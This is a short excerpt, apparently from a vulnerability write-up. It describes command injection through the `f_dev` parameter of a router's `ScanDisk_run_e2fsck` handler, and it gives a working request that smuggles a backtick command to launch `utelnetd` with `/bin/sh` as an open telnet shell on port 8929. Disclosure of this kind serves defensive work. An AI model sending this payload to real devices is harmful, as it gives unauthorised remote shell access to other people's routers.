...
In `ScanDisk_run_e2fsck` function, `f_dev` is directly passed by the attacker, so we can control the `f_dev` to attack the OS.
...
We set `f_dev` as **`utelnetd -p 8929 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=ScanDisk_run_e2fsck&f_dev=`utelnetd -p 8929 -l /bin/sh`
```
